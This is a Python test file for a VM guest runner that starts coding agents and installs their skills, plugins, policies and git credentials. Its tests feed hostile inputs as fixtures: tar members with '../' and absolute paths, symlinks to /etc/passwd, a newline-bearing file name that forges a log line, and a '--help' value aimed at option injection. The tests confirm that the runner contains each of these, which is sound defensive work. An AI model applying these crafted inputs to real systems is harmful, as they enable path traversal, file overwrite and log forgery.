"""Tests for the guest runner pieces that can run outside a VM."""

import importlib.util
import json
import os
import pwd
import shutil
import stat
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import unittest
from unittest import mock

from cilly.inject import build_task_disk, scan

RUNNER = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "cilly", "guest", "cilly-runner.py")


def load_runner():
    spec = importlib.util.spec_from_file_location("cilly_runner", RUNNER)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    def no_pkill():  # never the real one: on a machine with a user called agent it kills everything of theirs
        raise AssertionError("a test reached the real pkill -u agent")
    mod._pkill_agent = no_pkill
    mod.DROP_CACHES = os.devnull  # never the real one, should the tests run as root
    return mod


class RunnerTests(unittest.TestCase):
    def setUp(self):
        self.r = load_runner()
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.realpath(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_read_boot_with_inject(self):
        src = os.path.join(self.d, "home", "src")
        os.makedirs(os.path.join(src, "sub"))
        with open(os.path.join(src, "sub", "f.txt"), "w") as f:
            f.write("x")
        m = scan(src, home=os.path.join(self.d, "home"))
        disk = os.path.join(self.d, "task.tar")
        build_task_disk(disk, {"agent_id": "abc"}, m)
        with mock.patch.object(self.r, "TASK_DISK", disk):
            boot, (tf, inject, memory) = self.r.read_boot()
        self.assertEqual(boot["agent_id"], "abc")
        self.assertEqual(sorted(x.name for x in inject), ["inject", "inject/sub", "inject/sub/f.txt"])
        self.assertEqual(memory, [])
        tf.extractall(os.path.join(self.d, "out"), members=inject, filter="data")
        tf.close()
        self.assertTrue(os.path.isfile(os.path.join(self.d, "out", "inject", "sub", "f.txt")))

    def test_newer_runner_from_boot_disk_takes_over(self):
        import io as _io
        disk = os.path.join(self.d, "boot.tar")
        with tarfile.open(disk, "w") as tf:
            data = b"print('newer runner')\n"
            ti = tarfile.TarInfo("runner.py")
            ti.size = len(data)
            tf.addfile(ti, _io.BytesIO(data))
        calls = []
        with mock.patch.object(self.r, "TASK_DISK", disk), \
                mock.patch.object(self.r.os, "execv", lambda exe, argv: calls.append(argv)), \
                mock.patch.object(self.r.os, "makedirs"), \
                mock.patch("builtins.open", wraps=open) as op, \
                mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("CILLY_RUNNER_REEXEC", None)
            real_open = op._mock_wraps

            def fake_open(path, *a, **k):  # redirect /run/cilly into the temp dir
                if str(path).startswith("/run/cilly"):
                    path = os.path.join(self.d, os.path.basename(path))
                return real_open(path, *a, **k)
            op.side_effect = fake_open
            with mock.patch.object(self.r.os, "chmod"):
                self.r.maybe_reexec_newer_runner()
        self.assertEqual(calls and calls[0][-1], "/run/cilly/runner.py")
        with open(os.path.join(self.d, "runner.py"), "rb") as f:
            self.assertEqual(f.read(), b"print('newer runner')\n")

    def test_pack_dir_skips_git(self):
        import io as _io
        root = os.path.join(self.d, "scratch")
        for p in (".git", ".GIT", "sub/.git", "sub/keep"):
            os.makedirs(os.path.join(root, p))
        for p in (".git/config", ".GIT/config", "sub/.git/config", "sub/keep/a.txt", "work.git"):
            with open(os.path.join(root, p), "w") as f:
                f.write("x")
        with open(os.path.join(root, "sub", "keep", ".git"), "w") as f:
            f.write("gitdir: /elsewhere")
        out = _io.BytesIO()
        self.r._h_pack_dir(out, root, True)
        out.seek(0)
        with tarfile.open(fileobj=out) as tf:
            self.assertEqual(sorted(tf.getnames()), ["sub", "sub/keep", "sub/keep/a.txt", "work.git"])

    def research_run(self, answer) -> tuple:
        """run_research_task with everything outside the control channel stubbed out.  answer is what
        the panel says to the findings: "outbox_ok", "outbox_refused" or None (nothing)."""
        files = [{"path": f"f{i}.md", "content": "é\"\\🔬" * 60_000} for i in range(3)]
        lines, moved = [], []
        r = self.r

        class Ctl:
            def send(self, **m):
                line = json.dumps(m).encode()
                lines.append(line)
                if answer and m["type"] == "outbox_end":
                    msg = {"type": answer, "task": m["task"], "error": "delivery too large"}
                    threading.Timer(0.05, lambda: r.outbox_answer(msg)).start()
        with mock.patch.multiple(r, agent_env=lambda b, t: {}, home_dir=lambda *p: "/x/" + "/".join(p),
                                 ensure_agent_dir=lambda p: None, load_state=lambda: {}, save_state=lambda s: None,
                                 conversation_args=lambda *a: [], run_as_agent=lambda *a, **k: 0,
                                 kill_agent_processes=lambda: None, collect_text_files=lambda *a: files,
                                 report_outbox_images=lambda *a: None, OUTBOX_ACK_TIMEOUT=0.5, log=lambda m: None,
                                 _archive=lambda src, tid: moved.append(f"/x/sent/{tid}"),
                                 as_agent=lambda name, *a, **k: moved.append(a[1]) if name == "archive_outbox" else None):
            r.run_research_task({}, {"id": "t1", "instructions": "q", "agent_argv": ["claude", "-p", "{instructions}"]}, Ctl())
        return lines, moved, files

    def test_findings_go_in_pieces_and_leave_the_outbox_whatever_the_answer(self):
        lines, moved, files = self.research_run("outbox_ok")
        self.assertTrue(all(len(ln) < 1 << 20 for ln in lines), max(len(ln) for ln in lines))
        parts = [json.loads(ln) for ln in lines if b'"outbox_chunk"' in ln]
        self.assertGreater(len(parts), 1)
        import base64
        self.assertEqual(json.loads(b"".join(base64.b64decode(p["data"]) for p in parts)), files)
        self.assertEqual(moved, ["/x/sent/t1"])
        # refused: set aside and never sent again, so they can't block every later delivery
        self.assertEqual(self.research_run("outbox_refused")[1], ["/x/sent/refused-t1"])
        # no answer: set aside too, never sent along with a later task's findings
        lines, moved, _ = self.research_run(None)
        self.assertEqual(moved, ["/x/sent/unconfirmed-t1"])
        self.assertEqual(json.loads(lines[-1])["state"], "done")

    def test_a_file_name_cant_fake_a_log_line(self):
        root = os.path.join(self.d, "outbox")
        os.makedirs(root)
        with open(os.path.join(root, "x\n12:00:00Z selftest PASS: everything is fine.md"), "w") as f:
            f.write("text")
        logged = []
        with mock.patch.object(self.r, "log", logged.append):
            self.r._h_collect_text_files(root, 1 << 20, 1 << 20)
        self.assertEqual(len(logged), 1)
        self.assertNotIn("\n", logged[0])  # the name is quoted, its newline escaped

    def test_outbox_names_and_count_follow_the_panel(self):
        from cilly import handoff as H
        root = os.path.join(self.d, "outbox")
        os.makedirs(root)
        for n in ["ok.md", "x" * 121 + ".md", "y" * 200 + ".md"] + [f"f{i:03}.md" for i in range(210)]:
            with open(os.path.join(root, n), "w") as f:
                f.write("text")
        with mock.patch.object(self.r, "log", lambda m: None):
            files = self.r._h_collect_text_files(root, 10 << 20, 1 << 20)
        self.assertEqual(len(files), self.r.OUTBOX_FILES_MAX)
        self.assertEqual(self.r.OUTBOX_FILES_MAX, H.MAX_FILES)
        self.assertEqual(self.r.OUTBOX_NAME.pattern, H._SAFE.pattern)
        self.assertFalse([f for f in files if len(f["path"]) > 121])
        H.validate_files(files, 10 << 20)  # what the runner sends, the panel takes

    def test_chat_sends_its_newest_event_without_waiting_for_another(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        relay = self.r.ChatRelay(Ctl(), "t1")
        relay.feed(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "Building now."}]}}))
        relay.feed(json.dumps({"type": "assistant", "message": {"content": [
            {"type": "tool_use", "id": "b1", "name": "Bash", "input": {"command": "./gradlew build"}}]}}))
        time.sleep(1.2)  # a long build: nothing else arrives
        events = [e for m in sent for e in m["events"]]
        self.assertEqual([e["k"] for e in events], ["text", "tool"])
        relay.close()
        self.assertTrue(relay.closed.is_set())

    def test_claude_codes_own_notices_arent_the_agents_words(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        relay = self.r.ChatRelay(Ctl(), "t1")
        line = '[claude-code:unrecognized_model] {"model":"qwen3.5:9b","query_source":"sdk"}'
        self.assertEqual(relay.feed(line), line)  # still in the log
        relay.feed("[claude-code:some_other_notice] {}")
        relay.feed("plain text from somewhere")
        relay.close()
        events = [e for m in sent for e in m["events"]]
        self.assertEqual(events, [{"k": "text", "text": "plain text from somewhere"}])

    def test_skills_are_unpacked_as_the_agent_and_taken_away(self):
        """Into ~/.claude/skills/<name>/ before Claude starts, from the tar the panel sent with its hash.
        Only plain files land, inside the folder, even from a tar that tries more."""
        import hashlib
        import io
        home, attach = os.path.join(self.d, "home"), os.path.join(self.d, "attachments")
        os.makedirs(os.path.join(attach, "skills"))
        os.makedirs(home)

        def tar_of(members):
            buf = io.BytesIO()
            with tarfile.open(fileobj=buf, mode="w") as t:
                for name, body, kind in members:
                    info = tarfile.TarInfo(name)
                    if kind == "link":
                        info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
                        t.addfile(info)
                    else:
                        info.size, info.mode = len(body), 0o755 if kind == "exe" else 0o644
                        t.addfile(info, io.BytesIO(body))
            return buf.getvalue()
        data = tar_of([("SKILL.md", b"---\nname: pixel\ndescription: d\n---\n", "file"), ("scripts/run.sh", b"echo\n", "exe"),
                       ("../escape.txt", b"x", "file"), ("/abs.txt", b"x", "file"), ("link", b"", "link")])
        with open(os.path.join(attach, "skills", "pixel.tar"), "wb") as f:
            f.write(data)
        sha = hashlib.sha256(data).hexdigest()
        # a link the agent planted where the skill goes: it's replaced, never written through
        elsewhere = os.path.join(self.d, "elsewhere")
        os.makedirs(elsewhere)
        os.makedirs(os.path.join(home, ".claude", "skills"))
        os.symlink(elsewhere, os.path.join(home, ".claude", "skills", "pixel"))
        sent = []
        ctl = type("Ctl", (), {"send": lambda self, **m: sent.append(m)})()
        real_run, me = subprocess.run, pwd.getpwuid(os.getuid())

        def as_me(*a, **kw):  # switching to the agent needs root, which CI isn't
            for k in ("user", "group", "extra_groups"):
                kw.pop(k, None)
            return real_run(*a, **kw)

        def write(path, b):
            with open(path, "wb") as f:
                f.write(b)

        def run(skills, **extra):
            sent.clear()
            task = {"id": "t1", "agent_argv": ["/usr/bin/claude", "-p"], **({"skills": skills} if skills is not None else {}), **extra}
            with mock.patch.object(self.r.pwd, "getpwnam", return_value=me), mock.patch.object(self.r, "home_dir", lambda *p: os.path.join(home, *p)), \
                    mock.patch.object(self.r, "ATTACH_DIR", attach), mock.patch.object(self.r, "SKILLS_FILE", os.path.join(self.d, "state", "skills.json")), \
                    mock.patch.object(self.r, "_write_root_file", write), mock.patch.object(self.r.subprocess, "run", as_me), \
                    mock.patch.object(self.r, "log", lambda m: None):
                self.r.ensure_skills(task, ctl)
            return [e["text"] for m in sent for e in m["events"]]
        dest = os.path.join(home, ".claude", "skills", "pixel")
        self.assertEqual(run([{"name": "pixel", "sha256": sha}, {"name": "../x", "sha256": sha}, {"name": "other", "sha256": "0" * 64}]),
                         ["Added the skill pixel", "Couldn't add the skill other: its files haven't arrived. Try again in a moment."])
        self.assertFalse(os.path.islink(dest))
        self.assertEqual(os.listdir(elsewhere), [])
        files = sorted(os.path.relpath(os.path.join(dp, f), dest) for dp, _, fs in os.walk(dest) for f in fs)
        self.assertEqual(files, ["SKILL.md", "abs.txt", "scripts/run.sh"])  # no link; tar's rules keep /abs.txt inside, and drop ../
        self.assertFalse(os.path.exists(os.path.join(home, ".claude", "escape.txt")))
        self.assertTrue(os.stat(os.path.join(dest, "scripts", "run.sh")).st_mode & 0o100)
        self.assertEqual(sorted(os.listdir(os.path.join(home, ".claude", "skills"))), ["pixel"])  # no leftovers
        self.assertEqual(run([{"name": "pixel", "sha256": sha}]), [])  # already there
        self.assertEqual(run(None), [])  # a panel from before skills
        self.assertEqual(run([{"name": "pixel", "sha256": sha}], agent_argv=["/usr/bin/opencode"]), [])  # skills are Claude Code's
        self.assertEqual(run([]), ["Removed the skill pixel"])
        self.assertFalse(os.path.exists(dest))
        # the panel took it away: its tar goes too, and nothing else in there is touched
        os.symlink("/etc/passwd", os.path.join(attach, "skills", "planted"))
        with mock.patch.object(self.r, "ATTACH_DIR", attach), mock.patch.object(self.r, "log", lambda m: None):
            self.r.sync_project_files([], "skills")
        self.assertEqual(os.listdir(os.path.join(attach, "skills")), ["planted"])

    def test_plugins_are_installed_before_claude_and_removed_when_taken_away(self):
        """As the agent, with Claude Code's own installer. A plugin that installs by running a command only
        goes in with the sha256 you allowed. The task's tokens stay out of it."""
        bin_dir, calls = os.path.join(self.d, "bin"), os.path.join(self.d, "calls")
        os.makedirs(bin_dir)
        claude = os.path.join(bin_dir, "claude")
        with open(claude, "w") as f:
            f.write(f"""#!{sys.executable}
import json, os, sys
a = sys.argv[1:]
with open({calls!r}, "a") as f:
    f.write(json.dumps([a, "GH_TOKEN" in os.environ]) + "\\n")
print("progress text")
if a[1] == "uninstall":
    print(json.dumps({{"outcome": "ok"}}))
elif a[2] == "good":
    print(json.dumps({{"outcome": "ok", "pluginId": "good@market"}}))
elif a[2] == "cmd" and "--accept-command" not in a:
    print(json.dumps({{"outcome": "failed", "shownCommand": {{"sha256": "ab" * 32, "command": "npm i x"}}}}))
elif a[2] == "cmd":
    print(json.dumps({{"outcome": "ok", "pluginId": "cmd@market"}}))
else:
    print(json.dumps({{"outcome": "failed", "message": "Plugin not found"}}))
    sys.exit(1)
""")
        os.chmod(claude, 0o755)
        sent = []
        ctl = type("Ctl", (), {"send": lambda self, **m: sent.append(m)})()
        task = {"id": "t1", "agent_argv": [claude, "-p"], "env": {"GH_TOKEN": "ghs_x"},
                "plugins": [{"name": "good", "marketplace": "o/good"}, {"name": "cmd", "marketplace": "o/cmd"},
                            {"name": "nope", "marketplace": "o/nope"}, {"name": "../bad", "marketplace": "o/x"},
                            {"name": "opt", "marketplace": "--help"}]}
        env = {"PATH": os.environ["PATH"], "GH_TOKEN": "ghs_x", "HOME": self.d}

        def write(path, data):
            with open(path, "wb") as f:
                f.write(data)
        real_run, users = subprocess.run, []

        def as_me(*a, **kw):  # switching to the agent needs root, which CI isn't: it's asked for, then left out
            users.append((kw.pop("user", None), kw.pop("group", None), kw.pop("extra_groups", None) == []))
            return real_run(*a, **kw)

        def run(t):
            sent.clear()
            with mock.patch.object(self.r.pwd, "getpwnam", return_value=pwd.getpwuid(os.getuid())), \
                    mock.patch.object(self.r, "PLUGINS_FILE", os.path.join(self.d, "state", "plugins.json")), \
                    mock.patch.object(self.r, "_write_root_file", write), mock.patch.object(self.r.subprocess, "run", as_me), \
                    mock.patch.object(self.r, "log", lambda m: None):
                self.r.ensure_plugins(t, ctl, env, self.d)
            return {m["type"]: m for m in sent}
        got = run(task)
        self.assertEqual([(r["name"], r["state"]) for r in got["plugins"]["results"]],
                         [("good", "installed"), ("cmd", "needs_command"), ("nope", "failed")])
        self.assertEqual((got["plugins"]["results"][1]["sha256"], got["plugins"]["results"][1]["command"]), ("ab" * 32, "npm i x"))
        self.assertEqual(got["plugins"]["results"][2]["message"], "Plugin not found")
        self.assertEqual([e["text"] for e in got["chat"]["events"]], ["Installed the plugin good",
                         "The plugin cmd installs by running a command. Allow it in the panel first.",
                         "Couldn't install the plugin nope: Plugin not found"])
        with open(calls) as f:
            log = [json.loads(line) for line in f]
        self.assertEqual(log[0][0], ["plugin", "install", "good", "--marketplace", "o/good", "--json"])
        self.assertFalse(any(tok for _, tok in log))  # no token in an install
        me = pwd.getpwuid(os.getuid())
        self.assertEqual(set(users), {(me.pw_uid, me.pw_gid, True)})  # each one as the agent user, without its groups
        self.assertNotIn("../bad", json.dumps(log))
        self.assertNotIn("--help", json.dumps(log))  # a marketplace that looks like an option isn't passed on
        # you allowed cmd's command, and took good away
        task["plugins"] = [{"name": "cmd", "marketplace": "o/cmd", "accept": "ab" * 32}]
        got = run(task)
        self.assertEqual([e["text"] for e in got["chat"]["events"]], ["Removed the plugin good", "Installed the plugin cmd"])
        with open(calls) as f:
            log = [json.loads(line)[0] for line in f][3:]
        self.assertEqual(log, [["plugin", "uninstall", "good@market", "--json"],
                               ["plugin", "install", "cmd", "--marketplace", "o/cmd", "--accept-command", "ab" * 32, "--json"]])
        self.assertEqual(run(task), {})  # installed already: nothing to do
        self.assertEqual(run({"id": "t2", "agent_argv": [claude, "-p"]}), {})  # an older panel: left alone
        self.assertEqual(run(dict(task, agent_argv=["opencode"])), {})

    def test_the_chat_timer_stops_when_the_run_cant_start(self):
        relay = self.r.ChatRelay(type("Ctl", (), {"send": lambda self, **m: None})(), "t1")
        with mock.patch.object(self.r.pwd, "getpwnam", return_value=pwd.getpwuid(os.getuid())), \
                mock.patch.object(self.r.subprocess, "Popen", side_effect=FileNotFoundError("claude")), \
                mock.patch.object(self.r, "log", lambda m: None):
            with self.assertRaises(FileNotFoundError):
                self.r.run_as_agent(["claude"], {}, self.d, relay=relay)
        self.assertTrue(relay.closed.is_set())

    def test_question_files_are_carried_to_the_panel_and_moved_away(self):
        ask, sent = os.path.join(self.d, "ask"), os.path.join(self.d, "sent", "ask-t1")
        os.makedirs(ask)
        for name, data in (("b.json", b'{"version": 1}'), ("a.json", b"x" * (self.r.ASK_MAX + 500)), ("notes.txt", b"no"),
                           ("bad\xff.json".encode("latin-1").decode("latin-1"), b"{}"), ("c.json", b"\xff\xfe not text")):
            with open(os.path.join(ask, name), "wb") as f:
                f.write(data)
        os.symlink("/etc/passwd", os.path.join(ask, "link.json"))
        files = self.r._h_read_asks(ask, sent)
        self.assertEqual([f["name"] for f in files], ["a.json", "b.json", "c.json"])  # sorted, only plain .json files
        self.assertEqual(len(files[0]["text"]), self.r.ASK_MAX + 1)  # too big: enough for the panel to say so
        self.assertEqual(files[1]["text"], '{"version": 1}')
        self.assertTrue(os.path.isdir(ask) and not os.listdir(ask))  # an empty ~/ask/ for next time
        self.assertIn("b.json", os.listdir(sent))
        self.assertEqual(self.r._h_read_asks(os.path.join(self.d, "none"), sent), [])
        for i in range(6):
            with open(os.path.join(ask, f"q{i}.json"), "w") as f:
                f.write("{}")
        self.assertEqual(len(self.r._h_read_asks(ask, sent + "2")), self.r.ASK_FILES)

    def test_save_state_never_writes_through_the_temp_name(self):
        path = os.path.join(self.d, ".claude", "cilly-state.json")
        target = os.path.join(self.d, "someone-elses-file")
        with open(target, "w") as f:
            f.write("keep")
        os.makedirs(os.path.dirname(path))
        for plant in ("symlink", "fifo"):
            (os.symlink(target, path + ".tmp") if plant == "symlink" else os.mkfifo(path + ".tmp"))
            th = threading.Thread(target=self.r._h_save_state, args=(path, {"conversation": {"/w": True}}), daemon=True)
            th.start()
            th.join(5)
            if th.is_alive():  # stuck on the FIFO: unblock it so the test can end
                os.close(os.open(path + ".tmp", os.O_RDONLY | os.O_NONBLOCK))
            self.assertFalse(th.is_alive(), plant)
            with open(target) as f:
                self.assertEqual(f.read(), "keep", plant)
            self.assertTrue(stat.S_ISREG(os.lstat(path).st_mode))
            self.assertEqual(self.r._h_load_state(path), {"conversation": {"/w": True}, "interrupted": {}})

    def test_control_channel_recv(self):
        fifo = os.path.join(self.d, "port")
        os.mkfifo(fifo)

        def host():
            fd = os.open(fifo, os.O_WRONLY)
            os.write(fd, b'{"type": "hello", "policy": {}}\n{"type": "task", "id": "t1"}\n')
            os.close(fd)
        th = threading.Thread(target=host)
        ctl = self.r.Control(fifo)
        th.start()
        self.assertEqual(ctl.recv(timeout=5)["type"], "hello")
        self.assertEqual(ctl.recv(timeout=5)["id"], "t1")
        th.join()

    def test_apply_policy_writes_root_owned_files(self):
        pol_dir = os.path.join(self.d, "etc-claude-code")
        chowns = []
        # In the VM the runner is root; here we only record the ownership changes.
        with mock.patch.object(self.r, "POLICY_DIR", pol_dir), mock.patch.object(self.r, "log", lambda m: None), \
                mock.patch.object(self.r.os, "chown", lambda p, u, g: chowns.append((os.path.basename(p), u, g))):
            self.r.apply_policy({"claude_md": "STYLE", "managed_settings": {"permissions": {"deny": ["X"]}},
                                 "permission_mode": "dontAsk",
                                 "managed_mcp": {"mcpServers": {"pixellab": {"type": "http", "url": "https://x/mcp",
                                                 "headers": {"Authorization": "Bearer ${PIXELLAB_API_KEY}"}}}}})
        with open(os.path.join(pol_dir, "managed-mcp.json")) as f:
            mcp = json.load(f)
        self.assertEqual(mcp["mcpServers"]["pixellab"]["headers"]["Authorization"], "Bearer ${PIXELLAB_API_KEY}")
        with open(os.path.join(pol_dir, "managed-settings.json")) as f:
            self.assertEqual(json.load(f)["permissions"]["deny"], ["X"])
        with open(os.path.join(pol_dir, "CLAUDE.md")) as f:
            self.assertEqual(f.read(), "STYLE")
        st = os.stat(os.path.join(pol_dir, "managed-settings.json"))
        self.assertEqual(st.st_mode & 0o777, 0o644)
        self.assertTrue(chowns and all(u == 0 and g == 0 for _, u, g in chowns), chowns)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_git_credential_helper_reads_env_only(self):
        home = os.path.join(self.d, "agenthome")
        os.makedirs(home)
        gcfg = os.path.join(self.d, "etc", "gitconfig")
        with mock.patch.object(self.r, "GLOBAL_GITCONFIG", gcfg):
            self.r.write_gitconfig({"identity": {"name": "bot", "email": "1+bot@users.noreply.github.com"}})
        env = {"HOME": home, "PATH": os.environ["PATH"], "GH_TOKEN": "tok-xyz", "GIT_CONFIG_NOSYSTEM": "1",
               "GIT_CONFIG_GLOBAL": gcfg}
        out = subprocess.run(["git", "credential", "fill"], input=b"protocol=https\nhost=github.com\n\n",
                             env=env, capture_output=True, timeout=10)
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertIn(b"username=x-access-token", out.stdout)
        self.assertIn(b"password=tok-xyz", out.stdout)
        name = subprocess.run(["git", "config", "--global", "user.email"], env=env, capture_output=True).stdout
        self.assertEqual(name.strip(), b"1+bot@users.noreply.github.com")
        with open(gcfg) as f:
            self.assertNotIn("tok-xyz", f.read())

    def test_no_undefined_names(self):
        """Poor man's pyflakes: every name a top-level function reads is bound
        somewhere in it, at module level, or is a builtin."""
        import ast
        import builtins
        with open(RUNNER) as f:
            tree = ast.parse(f.read())
        module = set(dir(builtins)) | {"__file__", "__name__"}
        for node in tree.body:
            if isinstance(node, (ast.FunctionDef, ast.ClassDef)):
                module.add(node.name)
            elif isinstance(node, (ast.Import, ast.ImportFrom)):
                module.update((a.asname or a.name).split(".")[0] for a in node.names)
            elif isinstance(node, (ast.Assign, ast.AnnAssign)):
                for t in (node.targets if isinstance(node, ast.Assign) else [node.target]):
                    module.update(n.id for n in ast.walk(t) if isinstance(n, ast.Name))
        for fn in tree.body:
            if not isinstance(fn, (ast.FunctionDef, ast.ClassDef)):
                continue
            bound = set()
            for n in ast.walk(fn):
                if isinstance(n, ast.Name) and isinstance(n.ctx, (ast.Store, ast.Del)):
                    bound.add(n.id)
                elif isinstance(n, ast.arg):
                    bound.add(n.arg)
                elif isinstance(n, (ast.FunctionDef, ast.ClassDef)):
                    bound.add(n.name)
                elif isinstance(n, ast.ExceptHandler) and n.name:
                    bound.add(n.name)
                elif isinstance(n, (ast.Import, ast.ImportFrom)):
                    bound.update((a.asname or a.name).split(".")[0] for a in n.names)
            for n in ast.walk(fn):
                if isinstance(n, ast.Name) and isinstance(n.ctx, ast.Load):
                    if n.id not in bound and n.id not in module:
                        self.fail(f"{fn.name} uses undefined name {n.id!r} (line {n.lineno})")

    def test_chat_relay_turns_stream_json_into_events(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        relay = self.r.ChatRelay(Ctl(), "t1")
        lines = [
            {"type": "system", "subtype": "init", "session_id": "s"},
            {"type": "assistant", "message": {"content": [
                {"type": "text", "text": "Building it."},
                {"type": "tool_use", "id": "a", "name": "Bash", "input": {"command": "./gradlew build\necho hi"}},
                {"type": "tool_use", "id": "b", "name": "Edit", "input": {"file_path": "/w/A.java",
                                                                       "old_string": "int a;\nint b;", "new_string": "int a;\nint c;"}},
                {"type": "tool_use", "id": "c", "name": "mcp__pixellab__create_sprite", "input": {"size": 32}},
                {"type": "tool_use", "id": "d", "name": "Write", "input": {"file_path": "/w/N.txt", "content": "x\ny"}}]}},
            {"type": "user", "message": {"content": [
                {"type": "tool_result", "tool_use_id": "a", "content": [{"type": "text", "text": "\nBUILD OK\nmore"}]},
                {"type": "tool_result", "tool_use_id": "c", "content": "quota exceeded", "is_error": True}]}},
            {"type": "result", "subtype": "success", "is_error": False, "num_turns": 4, "duration_ms": 900,
             "total_cost_usd": 0.02, "result": "done"},
        ]
        shown = [relay.feed(json.dumps(x)) for x in lines]
        shown.append(relay.feed("plain text line\n"))
        relay.close()
        ev = [e for m in sent for e in m["events"]]
        self.assertTrue(all(m["type"] == "chat" and m["task"] == "t1" for m in sent))
        self.assertEqual([e["k"] for e in ev], ["text", "tool", "diff", "tool", "diff", "result", "result", "done", "text"])
        self.assertEqual(ev[1], {"k": "tool", "id": "a", "tool": "Bash", "verb": "Ran", "target": "./gradlew build",
                                 "detail": "./gradlew build\necho hi"})  # the whole command, for expanding
        self.assertEqual((ev[2]["add"], ev[2]["del"]), (1, 1))
        self.assertIn(["+", "int c;"], ev[2]["lines"])
        self.assertEqual((ev[3]["verb"], ev[3]["target"]), ("MCP", "pixellab: create_sprite"))
        self.assertEqual((ev[4]["add"], ev[4]["del"]), (2, 0))
        self.assertEqual(ev[5], {"k": "result", "id": "a", "ok": True, "summary": "BUILD OK", "out": "BUILD OK\nmore"})
        self.assertNotIn("out", ev[6])  # one line: the summary is all of it
        self.assertFalse(ev[6]["ok"])
        self.assertEqual(ev[7], {"k": "done", "ok": True, "turns": 4, "ms": 900, "cost": 0.02})
        self.assertIsNone(shown[0])  # system init: nothing in the log
        self.assertIn("> Ran ./gradlew build", shown[1])
        self.assertEqual(shown[-1], "plain text line\n")
        from cilly.vm import _clean_chat_event
        self.assertEqual([_clean_chat_event(e) for e in ev], ev)  # the host accepts what the guest sends

    def test_chat_relay_progress_notes_and_session_id(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        relay = self.r.ChatRelay(Ctl(), "t1")
        sid = "0b3e8f4c-1d2a-4c5b-9e6f-7a8b9c0d1e2f"
        for x in [{"type": "system", "subtype": "init", "session_id": sid},
                  {"type": "system", "subtype": "status", "status": "compacting"},
                  {"type": "system", "subtype": "compact_boundary", "compact_metadata": {"pre_tokens": 154000}},
                  {"type": "system", "subtype": "api_retry", "attempt": 2, "retry_delay_ms": 4000},
                  {"type": "system", "subtype": "hook_started"},
                  {"type": "result", "subtype": "success", "is_error": False, "session_id": "not-a-uuid"}]:
            relay.feed(json.dumps(x))
        relay.close()
        ev = [e for m in sent for e in m["events"]]
        self.assertEqual([e.get("text") for e in ev[:3]], ["Compacting the conversation…", "Conversation compacted (was 154,000 tokens)",
                                                           "API request failed, retrying (attempt 2) in 4s"])
        self.assertEqual(ev[3], {"k": "done", "ok": True, "sid": sid})  # a bad id later doesn't replace it
        from cilly.vm import _clean_chat_event
        self.assertEqual([_clean_chat_event(e) for e in ev], ev)

    def context_relay(self):
        sent = []

        class Ctl:
            def send(self, **m):
                sent.append(m)
        relay = self.r.ChatRelay(Ctl(), "t1")
        self.addCleanup(relay.close)
        return relay, lambda: [m for m in sent if m["type"] == "context"]

    def test_the_context_size_counts_the_main_conversation_only(self):
        relay, context = self.context_relay()
        main, sid = "claude-opus-4-1-20250805[1m]", "8f0c6a1e-2b7d-4c55-9a0e-3d1f5e7b9c21"

        def assistant(content, usage, parent=None, model=main):
            return json.dumps({"type": "assistant", "parent_tool_use_id": parent, "session_id": sid, "message": {
                "id": "msg_1", "type": "message", "role": "assistant", "model": model, "content": content,
                "stop_reason": None, "usage": dict(usage, service_tier="standard")}})
        for line in [
            json.dumps({"type": "system", "subtype": "init", "session_id": sid, "model": main, "tools": ["Bash", "Task"]}),
            assistant([{"type": "text", "text": "Looking at the build."}],
                      {"input_tokens": 4, "cache_creation_input_tokens": 3200, "cache_read_input_tokens": 14000, "output_tokens": 12}),
            assistant([{"type": "tool_use", "id": "toolu_1", "name": "Task", "input": {"description": "Find callers"}}],
                      {"input_tokens": 4, "cache_creation_input_tokens": 3200, "cache_read_input_tokens": 14000, "output_tokens": 12}),
            # the subagent's own conversation: much bigger, and not this one's
            assistant([{"type": "tool_use", "id": "toolu_2", "name": "Grep", "input": {"pattern": "build"}}],
                      {"input_tokens": 9, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 150000, "output_tokens": 40},
                      parent="toolu_1", model="claude-3-5-haiku-20241022"),
            json.dumps({"type": "user", "parent_tool_use_id": None, "message": {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_1", "content": "3 callers"}]}}),
            assistant([{"type": "text", "text": "API Error: overloaded"}],  # made up by Claude Code: no real usage
                      {"input_tokens": 0, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 0, "output_tokens": 0},
                      model="<synthetic>"),
            assistant([{"type": "text", "text": "Fixed it."}],
                      {"input_tokens": 6, "cache_creation_input_tokens": 500, "cache_read_input_tokens": 17200, "output_tokens": 300}),
            json.dumps({"type": "result", "subtype": "success", "is_error": False, "num_turns": 3, "session_id": sid,
                        "result": "Fixed it.", "total_cost_usd": 0.12,
                        "usage": {"input_tokens": 30, "cache_read_input_tokens": 200000, "output_tokens": 500},  # the whole run's
                        "modelUsage": {main: {"inputTokens": 30, "outputTokens": 500, "contextWindow": 1000000},
                                       "claude-3-5-haiku-20241022": {"inputTokens": 400, "contextWindow": 200000}}}),
        ]:
            relay.feed(line)
        self.assertEqual([{k: m[k] for k in m if k != "type"} for m in context()],
                         [{"task": "t1", "used": 17216},  # the first right away
                          {"task": "t1", "used": 18006, "window": 1000000}])  # the newest one, sent with the result

    def test_context_updates_are_rate_limited(self):
        relay, context = self.context_relay()
        relay.CONTEXT_EVERY = 0.4

        def used(n):
            relay.feed(json.dumps({"type": "assistant", "parent_tool_use_id": None, "message": {
                "model": "claude-sonnet-4-5", "content": [], "usage": {"input_tokens": n, "output_tokens": 1}}}))
        for n in range(1, 50):  # missing cache counts are zero
            used(n)
        self.assertEqual([m["used"] for m in context()], [2])
        time.sleep(1.2)  # the newest one goes out once the time is up, and only once
        self.assertEqual([m["used"] for m in context()], [2, 50])
